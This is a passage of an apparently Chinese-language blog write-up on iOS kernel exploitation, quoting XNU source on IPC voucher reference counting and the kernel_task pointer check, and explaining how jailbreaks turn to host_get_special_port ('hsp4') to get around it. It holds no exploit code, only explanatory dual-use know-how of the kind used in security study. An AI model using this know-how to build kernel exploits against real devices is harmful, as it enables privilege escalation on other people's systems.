<p>IPC凭证代表一组任意属性，这些属性可以通过Mach消息中的发送权限在进程之间传递，与此相关的库是<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/libdispatch/libdispatch-1008.220.2/">libdispatch</a>。除<code>iv_refs</code>和<code>iv_port</code>外，其他的字段与管理凭证对象的全局列表和存储凭证所代表的属性有关。</p>
<p>voucher的iv_refs成员表示引用计数，从iOS12开始，<code>iv_refs</code>是32位的引用计数，值范围为1-0x0fffffff，超出此范围的引用计数将导致错误，这是一种新的防止整数溢出的缓解措施。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;refcnt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OS_REFCNT_MAX_COUNT     ((os_ref_count_t)0x0FFFFFFFUL)</span></span><br></pre></td></tr></table></figure>

<p>如下所示，访问超出此范围的任何值都会触发内核panic。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_underflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: underflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_assert_referenced</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: used unsafely when zero (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_check_overflow</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, <span class="type">os_ref_count_t</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(count &gt;= OS_REFCNT_MAX_COUNT)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: overflow (rc=%p, grp=%s)\n&quot;</span>, rc, ref_grp_name(rc));</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iv_port</code>表示此用户空间的凭证。</p>
<blockquote>
<p>通过调用<code>host_create_mach_voucher()</code>陷阱可以创建Mach凭证，返回代表凭证的端口，但是由于凭证是不可变的，当生成的凭证与已有的凭证完全相同时，就会返回现有凭证的引用，而不是创建一个新的凭证。</p>
</blockquote>
<p>voucher的<code>ipc_voucher_reference</code>和<code>ipc_voucher_release</code>函数仅检查voucher是否不为NULL，然后调用<code>iv_reference</code>和<code>iv_release</code>，最后分别调用<code>os_ref_retain</code>和<code>os_ref_release</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL == voucher)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	iv_reference(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_voucher_release</span><span class="params">(<span class="type">ipc_voucher_t</span> voucher)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (IPC_VOUCHER_NULL != voucher)</span><br><span class="line">		iv_release(voucher);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_reference</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	os_ref_retain(&amp;iv-&gt;iv_refs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">iv_release</span><span class="params">(<span class="type">ipc_voucher_t</span> iv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (os_ref_release(&amp;iv-&gt;iv_refs) == <span class="number">0</span>) &#123;</span><br><span class="line">		iv_dealloc(iv, TRUE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">os_ref_count_t</span> old = atomic_fetch_add_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, memory_order_relaxed);</span><br><span class="line">	os_ref_check_retain(rc, old);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_retain_group(rc-&gt;ref_group);</span><br><span class="line">	ref_log_op(rc-&gt;ref_group, (<span class="type">void</span> *)rc, REFLOG_RETAIN);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span></span><br><span class="line"><span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc, memory_order release_order, memory_order dealloc_order)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Care not to use &#x27;rc&#x27; after the decrement because it might be deallocated</span></span><br><span class="line"><span class="comment">	 * under us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">os_refgrp</span> *<span class="title">grp</span> =</span> rc-&gt;ref_group;</span><br><span class="line">	ref_log_op(grp, (<span class="type">void</span> *)rc, REFLOG_RELEASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">os_ref_count_t</span> val = atomic_fetch_sub_explicit(&amp;rc-&gt;ref_count, <span class="number">1</span>, release_order);</span><br><span class="line">	os_ref_check_underflow(rc, val);</span><br><span class="line">	<span class="keyword">if</span> (__improbable(--val == <span class="number">0</span>)) &#123;</span><br><span class="line">		atomic_load_explicit(&amp;rc-&gt;ref_count, dealloc_order);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">		ref_log_drop(grp, (<span class="type">void</span> *)rc); <span class="comment">/* rc is only used as an identifier */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OS_REFCNT_DEBUG</span></span><br><span class="line">	ref_release_group(grp, !val);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>BUILD/obj/EXPORT_HDRS/libkern/os/refcnt.h</code>中可以看到更多信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * os_ref_retain: acquire a reference (increment reference count by 1) atomically.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release: release a reference (decrement reference count) atomically and</span></span><br><span class="line"><span class="comment"> *		return the new count. Memory is synchronized such that the dealloc block</span></span><br><span class="line"><span class="comment"> *		(i.e. code handling the final release() == 0 call) sees up-to-date memory</span></span><br><span class="line"><span class="comment"> *		with respect to all prior release()s on the same refcnt object. This</span></span><br><span class="line"><span class="comment"> *		memory ordering is sufficient for most use cases.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_relaxed: same as release() but with weaker relaxed memory ordering.</span></span><br><span class="line"><span class="comment"> *		This can be used when the dealloc block is already synchronized with other</span></span><br><span class="line"><span class="comment"> *		accesses to the object (for example, with a lock).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * os_ref_release_live: release a reference that is guaranteed not to be the last one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">os_ref_retain</span><span class="params">(<span class="keyword">struct</span> os_refcnt *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">os_ref_count_t</span> <span class="title function_">os_ref_release_explicit</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc,</span></span><br><span class="line"><span class="params">		memory_order release_order, memory_order dealloc_order)</span> OS_WARN_RESULT;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_release, memory_order_acquire);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">os_ref_count_t</span> OS_WARN_RESULT</span><br><span class="line"><span class="title function_">os_ref_release_relaxed</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> os_ref_release_explicit(rc, memory_order_relaxed, memory_order_relaxed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">os_ref_release_live</span><span class="params">(<span class="keyword">struct</span> os_refcnt *rc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__improbable(os_ref_release_explicit(rc,</span><br><span class="line">			memory_order_release, memory_order_relaxed) == <span class="number">0</span>)) &#123;</span><br><span class="line">		panic(<span class="string">&quot;os_refcnt: unexpected release of final reference (rc=%p)\n&quot;</span>, rc);</span><br><span class="line">		__builtin_unreachable();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，可能会出现两种漏洞：</p>
<ul>
<li>以某种方式增加引用计数，从而导致溢出。如前所述，由于存在上限，这实际上是无法利用的。但是仍然可以将引用计数增加到0x0fffffff(7个f)。</li>
<li>将对象的引用计数设置为0，但是仍然有一个指向它的指针。由于引用计数变为0，对象将被释放，因此指向该对象的指针变成了悬空指针。</li>
</ul>
<h3 id="hsp4-Patch"><a href="#hsp4-Patch" class="headerlink" title="hsp4 Patch"></a>hsp4 Patch</h3><p>Apple为防止越狱者获得内核任务而实施的另一项技术是对<code>kernel_task</code>的指针检查。即使获得了内核任务的句柄也无法使用Mach VM调用。检查在<code>ipc_kobject_server()</code>函数的<code>ipc_kmsg_trace_send</code>函数调用处开始，它会调用<code>osfmk/kern/ipc_tt.c</code>中的<code>convert_port_to_task_with_exec_token</code>函数，第31行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	ipc_kobject_server</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Handle a message sent to the kernel.</span></span><br><span class="line"><span class="comment"> *		Generates a reply message.</span></span><br><span class="line"><span class="comment"> *		Version for Untyped IPC.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">ipc_kmsg_t</span></span><br><span class="line"><span class="title function_">ipc_kobject_server</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_kmsg_t</span>	request,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_option_t</span> __unused option)</span></span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Find the routine to call, and call it</span></span><br><span class="line"><span class="comment">	 * to perform the kernel function</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ipc_kmsg_trace_send(request, option);</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Check if the port is a task port, if its a task port then</span></span><br><span class="line"><span class="comment">		 * snapshot the task exec token before the mig routine call.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">ipc_port_t</span> port = request-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">		<span class="keyword">if</span> (IP_VALID(port) &amp;&amp; ip_kotype(port) == IKOT_TASK) &#123;</span><br><span class="line">			task = convert_port_to_task_with_exec_token(port, &amp;exec_token);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		(*ptr-&gt;routine)(request-&gt;ikm_header, reply-&gt;ikm_header);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Check if the exec token changed during the mig routine */</span></span><br><span class="line">		<span class="keyword">if</span> (task != TASK_NULL) &#123;</span><br><span class="line">			<span class="keyword">if</span> (exec_token != task-&gt;exec_token) &#123;</span><br><span class="line">				exec_token_changed = TRUE;</span><br><span class="line">			&#125;</span><br><span class="line">			task_deallocate(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!ipc_kobject_notify(request-&gt;ikm_header, reply-&gt;ikm_header))&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEVELOPMENT || DEBUG</span></span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">&quot;ipc_kobject_server: bogus kernel message, id=%d\n&quot;</span>,</span><br><span class="line">			request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* DEVELOPMENT || DEBUG */</span></span></span><br><span class="line">		    _MIG_MSGID_INVALID(request-&gt;ikm_header-&gt;msgh_id);</span><br><span class="line"></span><br><span class="line">		    ((<span class="type">mig_reply_error_t</span> *) reply-&gt;ikm_header)-&gt;RetCode</span><br><span class="line">			= MIG_BAD_ID;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		  kernel_task-&gt;messages_received++;</span><br><span class="line">	    &#125;</span><br><span class="line">	    kernel_task-&gt;messages_sent++;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>convert_port_to_task_with_exec_token</code>函数调用<code>task_conversion_eval</code>函数，第27行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	convert_port_to_task_with_exec_token</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Convert from a port to a task and return</span></span><br><span class="line"><span class="comment"> *		the exec token stored in the task.</span></span><br><span class="line"><span class="comment"> *		Doesn&#x27;t consume the port ref; produces a task ref,</span></span><br><span class="line"><span class="comment"> *		which may be null.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">task_t</span></span><br><span class="line"><span class="title function_">convert_port_to_task_with_exec_token</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>		port,</span></span><br><span class="line"><span class="params">	<span class="type">uint32_t</span>		*exec_token)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">task_t</span>		task = TASK_NULL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IP_VALID(port)) &#123;</span><br><span class="line">		ip_lock(port);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (	ip_active(port)					&amp;&amp;</span><br><span class="line">				ip_kotype(port) == IKOT_TASK		) &#123;</span><br><span class="line">			<span class="type">task_t</span> ct = current_task();</span><br><span class="line">			task = (<span class="type">task_t</span>)port-&gt;ip_kobject;</span><br><span class="line">			assert(task != TASK_NULL);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (task_conversion_eval(ct, task)) &#123;</span><br><span class="line">				ip_unlock(port);</span><br><span class="line">				<span class="keyword">return</span> TASK_NULL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (exec_token) &#123;</span><br><span class="line">				*exec_token = task-&gt;exec_token;</span><br><span class="line">			&#125;</span><br><span class="line">			task_reference_internal(task);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ip_unlock(port);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查就在<code>task_conversion_eval()</code>函数中，caller是想要操作任务端口的任务，victim是被操作的任务。首先检查caller是否为内核，如果是则返回成功。然后检查caller是否与victim相同，因为任务应该能够对其自身执行操作。第三次检查就是关键的地方了，如果想要操作kernel_task而自己不是kernel_task，则检查不会通过。不过这只是对kernel_task指针进行检查实现的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">	 * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">	 * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_EMBEDDED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On embedded platforms, only a platform binary can resolve the task port</span></span><br><span class="line"><span class="comment">	 * of another platform binary.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((victim-&gt;t_flags &amp; TF_PLATFORM) &amp;&amp; !(caller-&gt;t_flags &amp; TF_PLATFORM)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SECURE_KERNEL</span></span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">if</span> (cs_relax_platform_task_ports) &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* SECURE_KERNEL */</span></span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_EMBEDDED */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此尽管能够得到内核任务，但是仍将无法在其上调用Mach API，因为这里会返回<code>KERN_INVALID_SECURITY</code>，从而之前的函数将返回<code>TASK_NULL</code>。</p>
<blockquote>
<p>在嵌入式平台上，代码会检查代码签名中的<code>TF_PLATFORM</code>标志，它是<code>platform-application entitlement</code>，这意味着没有此entitlement的caller无法对拥有这项entitlement的victim执行操作(只有Apple的文件才有这个entitlement)。</p>
</blockquote>
<p>因此，较新的技术之一就是使用<code>host_get_special_port()</code>函数，来看看<code>osfmk/mach/host_special_ports.h</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Cannot be set or gotten from user space</span></span><br><span class="line"><span 